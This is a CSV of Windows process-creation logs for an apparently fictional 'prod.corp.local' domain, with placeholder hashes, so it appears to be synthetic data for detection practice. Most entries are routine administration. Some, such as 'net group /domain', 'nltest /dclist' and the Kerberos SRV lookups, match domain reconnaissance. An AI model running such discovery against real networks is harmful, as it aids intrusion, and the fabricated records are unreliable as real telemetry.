2026-02-05T09:37:26.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-NetFirewallProfile -Profile Domain -Enabled True""",16970,explorer.exe,17087,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,d2183099c502931417a86dd01764123a
2026-02-01T09:34:15.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-StoragePool""",17340,explorer.exe,17510,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,e83e43f55ee92d827eded99cbb3b5459
2026-02-15T08:37:06.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Cluster""",17614,explorer.exe,17693,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,5f6404b8a42ad0320f332a6d9b0a7db8
2026-02-26T08:16:48.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Add-Computer -DomainName prod.corp.local""",17867,explorer.exe,18072,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,4bf26be69bca56f957ee2b87f4ad88b4
2026-02-19T09:39:35.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-PhysicalDisk""",18368,explorer.exe,18630,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,bf31ff1bc7a75a58883c4d5402fb93af
2026-02-23T09:20:14.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Test-ComputerSecureChannel -Repair""",18705,explorer.exe,18772,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,2bbed45d8090ce11b9125213b1edd15d
2026-02-27T09:22:35.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-WindowsCapability -Online""",18930,explorer.exe,19057,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,754b0eaf55e6b09147d9e3154096c84e
2026-02-26T10:16:22.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Enable-WindowsOptionalFeature -FeatureName Telnet-Client -Online""",19334,explorer.exe,19537,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,db0faf482401aff3c26b575b0300b156
2026-02-25T12:05:14.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-NetRoute""",19571,explorer.exe,19633,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,16a77895c936a71f1a507e1726765480
2026-02-10T10:01:33.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Set-ItemProperty -Path HKLM:\System -Name timeout -Value 30""",19682,explorer.exe,19703,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,d943608c5e28b864bc49a76a5652cd16
2026-02-07T12:23:22.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-Certificate -CertStoreLocation Cert:\LocalMachine\My""",19728,explorer.exe,19837,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,a44b63e17a8de249009a3951a997afe3
2026-02-16T12:39:32.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Import-Certificate -FilePath C:\certs\server.cer""",19987,explorer.exe,20072,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,d2e9529b60ce68f8d3be92ab60d45f86
2026-02-23T12:15:25.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-AppxPackage -AllUsers""",20109,explorer.exe,20253,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,eced14b7d455fcad58f671a742af695d
2026-02-06T09:32:33.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Invoke-WebRequest https://www.microsoft.com -Method Head""",20399,explorer.exe,20515,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,74d5df2d573ec6751c3a17c8d2ee49ab
2026-02-01T12:16:30.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-SmbShare""",20652,explorer.exe,20732,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,44a690ffc839f67dfe1487f5a7fe3297
2026-02-04T12:56:47.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup _kerberos._tcp.prod.corp.local,20994,explorer.exe,21131,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,cf6794e6346cdebc4ca96dffd97bda4d
2026-02-04T12:12:37.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c net group /domain,21155,explorer.exe,21262,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,bc5820e08447620c4f8e4f1986a840c4
2026-02-20T11:24:09.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c set,21505,explorer.exe,21805,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,42744c07e469ff11db50f5803088b913
2026-02-14T10:46:06.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c assoc .pdf,21917,explorer.exe,21928,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,7b86adbe7e698f104cd2d83f26d0fea4
2026-02-17T08:40:53.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c bcdedit /enum,22085,explorer.exe,22309,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,a5f014de0befe1519738f77b0619f331
2026-02-18T08:23:12.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c certutil -hashfile C:\setup.exe SHA256,22501,explorer.exe,22620,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,a5ae1b500874323b287456c642ea3813
2026-02-07T11:52:28.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c sfc /scannow,22644,explorer.exe,22822,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,40c530d2216be746a8b313982ffbbf2c
2026-02-04T08:52:36.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c dism /online /get-features,22947,explorer.exe,23013,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,377a4262f72c96ad6d4993aebdeec5a4
2026-02-13T09:34:15.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c winrm quickconfig,23259,explorer.exe,23500,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,ad376493a1f6cb94eaff99ec324a969a
2026-02-23T12:55:02.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c net time /domain,23757,explorer.exe,23872,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,edaddcb4958919fc0403692941b60503
2026-02-03T08:59:56.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""NightlyReport"" /tr ""C:\Reports\gen.exe"" /sc daily /st 01:00 /f",24115,powershell.exe,24245,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,1d11b0e98b4940a60fe4dcc7164bd510
2026-02-04T12:32:35.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""VPNHealthCheck"" /tr ""C:\VPN\healthcheck.exe"" /sc hourly /f",24254,powershell.exe,24481,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,75fd13832a907d5dbf44d37c14affb13
2026-02-01T09:53:09.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""DBMaintenance"" /tr ""sqlcmd.exe -S localhost -Q DBCC"" /sc weekly /f",24776,powershell.exe,25011,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,ba2b59f17d9253d22982a028e76d13e9
2026-02-14T10:47:14.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""AssetScan"" /tr ""C:\ITAM\scan.exe"" /sc daily /f",25230,powershell.exe,25433,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,f9c78870aab18a405ce0ba52c0142004
2026-02-17T12:25:57.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""LogArchive"" /tr ""C:\Logs\archive.exe"" /sc monthly /f",25482,powershell.exe,25707,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,a73e071f728c89079ec78a952cfd8e57
2026-02-03T12:25:05.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSHealthCheck"" /tr ""powershell.exe -File C:\Monitoring\health.ps1"" /sc hourly /f",25732,powershell.exe,25771,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,cb531e9196cd1212413b3a9acad75d66
2026-02-01T12:43:31.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSInventory"" /tr ""powershell.exe -c Get-ComputerInfo | Out-File C:\inv.txt"" /sc daily /f",26000,powershell.exe,26121,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,731dfd78d36f6ce037815eaea7a116b8
2026-02-14T09:51:57.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSPatchCheck"" /tr ""powershell.exe -File C:\Patch\check.ps1"" /sc weekly /f",26345,powershell.exe,26595,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,3c57aa2fcd35c3bf4d8b16eb1940ab16
2026-02-18T10:02:04.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSLogCleanup"" /tr ""powershell.exe -c Remove-Item C:\Logs\*.old"" /sc monthly /f",26656,powershell.exe,26668,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,834757d2479dd4ebec4b525c3f954b30
2026-02-22T12:21:12.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSUserReport"" /tr ""powershell.exe -c Get-LocalUser | Export-Csv C:\rpt.csv"" /sc weekly /f",26952,powershell.exe,27019,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,e113865d3c652432a1124899ba2efb0a
2026-02-04T09:14:12.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSCertCheck"" /tr ""powershell.exe -File C:\Certs\verify.ps1"" /sc daily /f",27129,powershell.exe,27331,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,f0812bf56053b0f2a055cc74a895fd13
2026-02-12T12:12:44.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSNetScan"" /tr ""powershell.exe -c Test-NetConnection prod.corp.local"" /sc hourly /f",27603,powershell.exe,27827,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,0b89b8c5a1f7f2487fde97fe61b09113
2026-02-12T10:34:11.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup prod-dc01.prod.corp.local,27906,cmd.exe,28149,cmd.exe /c nslookup prod-dc01.prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,6ac1d0de97a2f7f5516a647987cfe078
2026-02-24T09:40:13.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=NS prod.corp.local,28381,cmd.exe,28448,cmd.exe /c nslookup -type=NS prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,942902e42e911ef50e7b5dc860708aea
2026-02-23T10:48:11.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=PTR 10.20.1.101,28500,cmd.exe,28505,cmd.exe /c nslookup -type=PTR 10.20.1.101,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,2b6c96cfc2b413ee377814b3d028d376
2026-02-20T08:07:06.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=SOA prod.corp.local,28703,cmd.exe,29002,cmd.exe /c nslookup -type=SOA prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,fdaabc106a54e2ab5b62f9c261d296a8
2026-02-14T09:41:16.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup appserver.prod.corp.local,29013,cmd.exe,29308,cmd.exe /c nslookup appserver.prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,a334e2c01c58f7b08c09a9f8fd53ea97
2026-02-24T10:13:06.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=TXT prod.corp.local,29586,cmd.exe,29608,cmd.exe /c nslookup -type=TXT prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,81da54faec63a8a2ac48cba60caf414b
2026-02-08T11:52:35.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Sync-ADObject -Object CN=fmuller,OU=Users,DC=prod,DC=corp,DC=local""",29843,explorer.exe,29913,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,07a726c07e176226b1e2ca71ab02c976
2026-02-11T12:58:33.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Repair-Volume -DriveLetter C""",30086,explorer.exe,30136,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,0423e1ec7eae2671e99ad9f94b83bd44
2026-02-08T12:39:01.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-DscConfiguration""",30289,explorer.exe,30361,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,f671a2881bec878eae0c0ce76af1f3e0
2026-02-23T08:51:32.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Invoke-DscResource -Name WindowsFeature -Method Test -Property @{Name='RSAT'}""",30418,explorer.exe,30575,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,e9d283fb6a68490c300049efeb2a0cfb
2026-02-11T09:41:03.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nltest /dclist:prod.corp.local,30614,explorer.exe,30743,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,893dec3b52acf90084d286c40aeed42c
